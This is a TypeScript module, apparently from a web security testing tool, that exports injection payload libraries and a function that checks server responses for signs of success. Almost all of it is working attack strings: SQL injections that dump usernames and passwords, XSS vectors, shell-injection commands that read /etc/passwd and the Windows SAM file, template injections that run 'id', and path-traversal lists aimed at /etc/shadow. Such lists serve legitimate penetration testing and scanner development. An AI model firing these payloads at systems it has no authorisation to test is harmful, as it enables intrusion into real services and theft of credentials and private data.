/**
 * Attack payloads library for injection testing
 */

export const SQL_INJECTION_PAYLOADS = {
  // Basic SQL injection
  basic: [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\"--",
    "1' OR '1'='1",
    "1 OR 1=1",
    "1 OR 1=1--",
    "' OR ''='",
    "' OR 'x'='x",
  ],

  // Union-based
  union: [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' UNION SELECT 1,2,3--",
    "' UNION SELECT username,password FROM users--",
    "1' UNION SELECT table_name,NULL FROM information_schema.tables--",
  ],

  // Time-based blind
  timeBased: [
    "'; WAITFOR DELAY '0:0:5'--",
    "'; SELECT SLEEP(5)--",
    "'; SELECT pg_sleep(5)--",
    "1' AND SLEEP(5)--",
    "1'; WAITFOR DELAY '0:0:5'--",
  ],

  // Error-based
  errorBased: [
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
  ],

  // Polyglots
  polyglots: [
    "'/*' OR '1'='1'--",
    "\"/*\" OR \"1\"=\"1\"--",
    "' OR 1=1#",
    "admin'--",
    "admin' #",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
  ],
};

export const XSS_PAYLOADS = {
  // Reflected XSS
  reflected: [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    "<object data=\"javascript:alert(1)\">",
    "<embed src=\"javascript:alert(1)\">",
    "<math><maction actiontype=\"statusline#\" xlink:href=\"javascript:alert(1)\">CLICKME</maction></math>",
  ],

  // Script tag variations
  scriptTag: [
    "<script>alert(1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script/src=data:,alert(1)>",
    "<script>alert`1`</script>",
    "<script>alert(/1/.source)</script>",
  ],

  // Event handlers
  eventHandlers: [
    "<img src=x onerror=alert(1)>",
    "<img src=\"javascript:alert(1)\">",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<body onpageshow=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<details open ontoggle=alert(1)>",
  ],

  // Encoded
  encoded: [
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
  ],

  // DOM-based
  domBased: [
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
  ],

  // Polyglots
  polyglots: [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    "'\"><script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
    "javascript:alert(1)//'; alert(1)",
  ],
};

export const COMMAND_INJECTION_PAYLOADS = {
  // Unix
  unix: [
    "; ls",
    "| ls",
    "& ls",
    "&& ls",
    "|| ls",
    "`ls`",
    "$(ls)",
    "; ls -la",
    "| cat /etc/passwd",
    "; cat /etc/passwd",
    "`cat /etc/passwd`",
    "$(cat /etc/passwd)",
    "; id",
    "| id",
    "`id`",
    "$(id)",
    "; whoami",
    "| whoami",
  ],

  // Windows
  windows: [
    "& dir",
    "| dir",
    "&& dir",
    "|| dir",
    "& type C:\\Windows\\System32\\config\\SAM",
    "| type C:\\Windows\\System32\\config\\SAM",
    "& whoami",
    "| whoami",
  ],

  // Polyglots
  polyglots: [
    "; ls || dir",
    "| cat /etc/passwd || type C:\\boot.ini",
    "`id` || `whoami`",
    "$(cat /etc/passwd) || $(type C:\\boot.ini)",
  ],
};

export const NOSQL_INJECTION_PAYLOADS = {
  // MongoDB
  mongodb: [
    "{\"$gt\": \"\"}",
    "{\"$ne\": null}",
    "{\"$ne\": \"\"}",
    "{\"$gt\": null}",
    "{\"$where\": \"1==1\"}",
    "{\"$where\": \"this.password == this.username\"}",
    "{'$gt': ''}",
    "{'$ne': ''}",
    "[$ne]=1",
    "[$gt]=",
    "[$regex]=.*",
  ],

  // Operators
  operators: [
    "$ne",
    "$gt",
    "$lt",
    "$gte",
    "$lte",
    "$nin",
    "$in",
    "$exists",
    "$regex",
    "$where",
    "$or",
    "$and",
    "$not",
    "$nor",
  ],
};

export const TEMPLATE_INJECTION_PAYLOADS = {
  // Jinja2/Twig
  jinja: [
    "{{7*7}}",
    "{{7*'7'}}",
    "{{config}}",
    "{{self}}",
    "{{request}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{config.items()}}",
    "{{''.__class__.__bases__[0].__subclasses__()}}",
  ],

  // Freemarker
  freemarker: [
    "${7*7}",
    "#{7*7}",
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
  ],

  // Velocity
  velocity: [
    "#set($x=7*7)$x",
    "$class.inspect('java.lang.Runtime')",
    "#set($rt=$class.inspect('java.lang.Runtime').runtime)$rt.exec('id')",
  ],

  // ERB (Ruby)
  erb: [
    "<%= 7*7 %>",
    "<%= system('id') %>",
    "<%= `id` %>",
    "<%= File.read('/etc/passwd') %>",
  ],

  // Universal
  universal: [
    "${7*7}",
    "{{7*7}}",
    "<%= 7*7 %>",
    "#{7*7}",
    "*{7*7}",
    "${{7*7}}",
    "#{7*7}",
    "=7*7",
    "${{7*7}}",
    "{{7*'7'}}",
  ],
};

export const PATH_TRAVERSAL_PAYLOADS = {
  // Unix
  unix: [
    "../",
    "../../",
    "../../../",
    "../../../../",
    "../../../../../",
    "../../../../../../",
    "../../../../../../../",
    "../../../../../../../../",
    "....//",
    "....//....//",
    "....//....//....//",
    "%2e%2e%2f",
    "%2e%2e/",
    "..%2f",
    "%2e%2e%5c",
    "%2e%2e\\",
    "..%5c",
  ],

  // Windows
  windows: [
    "..\\",
    "..\\..\\",
    "..\\..\\..\\",
    "..%5c",
    "%2e%2e%5c",
    "%2e%2e\\",
  ],

  // Files to check
  targetFiles: [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/issue",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/var/log/auth.log",
    "/var/log/apache2/access.log",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\Windows\\win.ini",
    "C:\\Windows\\System32\\config\\SAM",
  ],
};

/**
 * Get payloads by type
 */
export function getPayloads(
  type: 'sqli' | 'xss' | 'cmdi' | 'nosqli' | 'ssti' | 'path'
): string[] {
  switch (type) {
    case 'sqli':
      return [
        ...SQL_INJECTION_PAYLOADS.basic,
        ...SQL_INJECTION_PAYLOADS.union,
        ...SQL_INJECTION_PAYLOADS.timeBased,
        ...SQL_INJECTION_PAYLOADS.polyglots,
      ];
    case 'xss':
      return [
        ...XSS_PAYLOADS.reflected,
        ...XSS_PAYLOADS.scriptTag,
        ...XSS_PAYLOADS.eventHandlers,
        ...XSS_PAYLOADS.polyglots,
      ];
    case 'cmdi':
      return [
        ...COMMAND_INJECTION_PAYLOADS.unix,
        ...COMMAND_INJECTION_PAYLOADS.windows,
        ...COMMAND_INJECTION_PAYLOADS.polyglots,
      ];
    case 'nosqli':
      return NOSQL_INJECTION_PAYLOADS.mongodb;
    case 'ssti':
      return TEMPLATE_INJECTION_PAYLOADS.universal;
    case 'path':
      return [...PATH_TRAVERSAL_PAYLOADS.unix, ...PATH_TRAVERSAL_PAYLOADS.windows];
    default:
      return [];
  }
}

/**
 * Check if response indicates vulnerability
 */
export function checkVulnerability(
  response: { status: number; body: string },
  type: 'sqli' | 'xss' | 'cmdi' | 'nosqli' | 'ssti' | 'path'
): { vulnerable: boolean; evidence?: string } {
  const body = response.body.toLowerCase();

  switch (type) {
    case 'sqli':
      // Check for SQL error messages
      if (
        body.includes('sql syntax') ||
        body.includes('mysql_fetch') ||
        body.includes('ora-') ||
        body.includes('postgresql') ||
        body.includes('sqlite3') ||
        body.includes('odbc') ||
        body.includes('unclosed quotation')
      ) {
        return { vulnerable: true, evidence: 'SQL error message in response' };
      }
      // Check for time-based (would need timing comparison)
      return { vulnerable: false };

    case 'xss':
      // Check if payload is reflected without escaping
      if (
        body.includes('<script>') ||
        body.includes('onerror=') ||
        body.includes('onload=') ||
        body.includes('onclick=') ||
        body.includes('javascript:')
      ) {
        return { vulnerable: true, evidence: 'Unescaped script in response' };
      }
      return { vulnerable: false };

    case 'cmdi':
      // Check for command output
      if (
        body.includes('root:') ||
        body.includes('nt authority') ||
        body.includes('uid=') ||
        body.includes('gid=') ||
        body.includes('total ') ||
        body.includes('drwx')
      ) {
        return { vulnerable: true, evidence: 'Command output in response' };
      }
      return { vulnerable: false };

    case 'path':
      // Check for file content indicators
      if (
        body.includes('root:x:0:0:') ||
        body.includes('[extensions]') ||
        body.includes('[fonts]') ||
        body.includes('bitbucket') ||
        body.includes('# $')
      ) {
        return { vulnerable: true, evidence: 'File content in response' };
      }
      return { vulnerable: false };

    case 'ssti':
      // Check for template execution (7*7=49)
      if (
        body.includes('49') ||
        body.includes('7777777')
      ) {
        // Need more context to confirm
        return { vulnerable: true, evidence: 'Template expression evaluated' };
      }
      return { vulnerable: false };

    default:
      return { vulnerable: false };
  }
}